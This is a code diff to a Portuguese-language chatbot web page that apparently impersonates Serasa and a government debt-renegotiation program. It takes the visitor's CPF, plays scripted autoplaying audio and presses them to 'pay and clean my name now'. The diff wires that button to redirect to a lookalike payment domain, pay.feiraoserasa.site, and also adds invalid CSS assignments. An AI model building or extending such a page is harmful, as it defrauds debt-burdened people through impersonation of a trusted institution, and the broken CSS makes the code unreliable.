@@ -417,7 +417,7 @@
 
   .cpf-input:focus {
     outline: none;
-    border-color: var(--primary);
+    border-color = var(--primary);
     box-shadow: 0 0 0 2px rgba(232, 0, 112, 0.1);
   }
 
@@ -480,6 +480,7 @@
   }
 
   .loading-gif {
+    display: none;
     width: 300px;
     height: 100px;
     background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
@@ -492,6 +493,14 @@
   @keyframes loading {
     0% { background-position: 200% 0; }
     100% { background-position: -200% 0; }
+  }
+
+  .audio-timer {
+    font-size: 0.7rem;
+    color: #666;
+    margin-top: 5px;
+    text-align: center;
+    font-style: italic;
   }
 
   @media (max-width: 480px) {
@@ -531,7 +540,7 @@
     }
     
     .logo-img {
-      width: calc(100vw - 40px);
+      width = calc(100vw - 40px);
       max-width: 100%;
       height: auto;
       max-height: 20vh;
@@ -587,6 +596,15 @@ console.log('CPF da URL:', urlCPF);
 
 // Dados do usuário
 let userCPF = '';
+
+// Durações dos áudios em segundos (ajuste conforme seus arquivos)
+const audioDurations = {
+  audio1: 17,   // Áudio de confirmação
+  audio2: 24,  // Áudio sobre empresas parceiras
+  audio3: 36,   // Áudio sobre análise
+  audio4: 34,   // Áudio sobre Desenrola Brasil
+  audio5: 30    // Áudio final
+};
 
 // Função para mascarar CPF
 function maskCPF(cpf) {
@@ -660,6 +678,9 @@ function addMessage(text, type = 'bot', sender = '', media = '') {
   
   messagesContainer.appendChild(messageDiv);
   scrollToBottom();
+  
+  // Retorna a div da mensagem para possível manipulação posterior
+  return messageDiv;
 }
 
 // Função para mostrar botões
@@ -687,9 +708,16 @@ function showButtons(buttons) {
         setTimeout(() => el.remove(), 300);
       });
       
-      setTimeout(() => {
-        processStep(button.next);
-      }, 600);
+      // VERIFICA SE TEM REDIRECT URL (ALTERAÇÃO FEITA AQUI)
+      if (button.redirectUrl) {
+        setTimeout(() => {
+          window.location.href = button.redirectUrl;
+        }, 1000);
+      } else {
+        setTimeout(() => {
+          processStep(button.next);
+        }, 600);
+      }
     });
     
     buttonsContainer.appendChild(btn);
@@ -808,11 +836,10 @@ function scrollToBottom() {
 const mediaUrls = {
   logoGovSer: './files/img1.webp',
   feiraoSemFraude: './files/img2.webp',
-  verificacaoInfo: './files/img3.webp',
-  empresas: './files/img4.webp',
-  feiraoEncerra: './files/img5.webp',
-  scoreImage: './files/img6.webp',
-  loadingGif: './files/img7.gif',
+  verificacaoInfo: './files/undefined-Imgur.gif',
+  empresas: './files/i0ru2501hphkj30ccq2zxph8.jpg',
+  feiraoEncerra: './files/cdjnv4qe3p98g7xpdjzjablm.png',
+  scoreImage: './files/f3fix5xne4w8mlawce5edzqc.png',
   audio1: './files/audio1.mp3',
   audio2: './files/audio2.mp3',
   audio3: './files/audio3.mp3',
@@ -888,12 +915,14 @@ const flow = [
     type: 'system',
     content: 'Áudio de confirmação',
     media: `<div class="message-media">
-      <audio controls class="media-audio">
+      <audio controls autoplay class="media-audio">
         <source src="${mediaUrls.audio1}" type="audio/mpeg">
         Seu navegador não suporta áudio.
       </audio>
+      <div class="audio-timer"></div>
     </div>`,
-    autoNext: true
+    audioStep: true,
+    audioFile: 'audio1'
   },
   {
     id: 9,
@@ -937,12 +966,14 @@ const flow = [
     type: 'system',
     content: 'Áudio sobre empresas parceiras',
     media: `<div class="message-media">
-      <audio controls class="media-audio">
+      <audio controls autoplay class="media-audio">
         <source src="${mediaUrls.audio2}" type="audio/mpeg">
         Seu navegador não suporta áudio.
       </audio>
+      <div class="audio-timer"></div>
     </div>`,
-    autoNext: true
+    audioStep: true,
+    audioFile: 'audio2'
   },
   {
     id: 15,
@@ -989,12 +1020,14 @@ const flow = [
     type: 'system',
     content: 'Áudio sobre análise',
     media: `<div class="message-media">
-      <audio controls class="media-audio">
+      <audio controls autoplay class="media-audio">
         <source src="${mediaUrls.audio3}" type="audio/mpeg">
         Seu navegador não suporta áudio.
       </audio>
+      <div class="audio-timer"></div>
     </div>`,
-    autoNext: true
+    audioStep: true,
+    audioFile: 'audio3'
   },
   {
     id: 21,
@@ -1009,12 +1042,14 @@ const flow = [
     type: 'system',
     content: 'Áudio sobre Desenrola Brasil',
     media: `<div class="message-media">
-      <audio controls class="media-audio">
+      <audio controls autoplay class="media-audio">
         <source src="${mediaUrls.audio4}" type="audio/mpeg">
         Seu navegador não suporta áudio.
       </audio>
+      <div class="audio-timer"></div>
     </div>`,
-    autoNext: true
+    audioStep: true,
+    audioFile: 'audio4'
   },
   {
     id: 23,
@@ -1067,12 +1102,14 @@ const flow = [
     type: 'system',
     content: 'Áudio final',
     media: `<div class="message-media">
-      <audio controls class="media-audio">
+      <audio controls autoplay class="media-audio">
         <source src="${mediaUrls.audio5}" type="audio/mpeg">
         Seu navegador não suporta áudio.
       </audio>
+      <div class="audio-timer"></div>
     </div>`,
-    autoNext: true
+    audioStep: true,
+    audioFile: 'audio5'
   },
   {
     id: 28,
@@ -1081,7 +1118,12 @@ const flow = [
     content: 'Para finalizar e limpar seu nome imediatamente, clique abaixo:',
     subtext: 'Você será redirecionado para uma página de pagamento 100% segura do Serasa.',
     buttons: [
-      { text: 'PAGAR E LIMPAR MEU NOME AGORA', next: 29, type: 'success' }
+      { 
+        text: 'PAGAR E LIMPAR MEU NOME AGORA', 
+        next: 29, 
+        type: 'success',
+        redirectUrl: 'https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E' // ← REDIRECT ADICIONADO AQUI
+      }
     ]
   },
   {
@@ -1121,7 +1163,16 @@ async function processStep(stepId) {
     
     addMessage(content, 'system', '', media);
     
-    if (step.autoNext && !step.isFinal) {
+    // Se for um passo de áudio, aguardar a duração do áudio antes de prosseguir
+    if (step.audioStep) {
+      const audioDuration = audioDurations[step.audioFile] || 5; // Padrão de 5 segundos se não definido
+      console.log(`Aguardando ${audioDuration} segundos (duração do áudio ${step.audioFile})...`);
+      
+      setTimeout(() => {
+        processStep(stepId + 1);
+      }, (audioDuration * 1000) + 500); // +500ms para margem de segurança
+    }
+    else if (step.autoNext && !step.isFinal) {
       setTimeout(() => processStep(stepId + 1), 1500);
     } else if (step.buttons) {
       setTimeout(() => showButtons(step.buttons), 500);
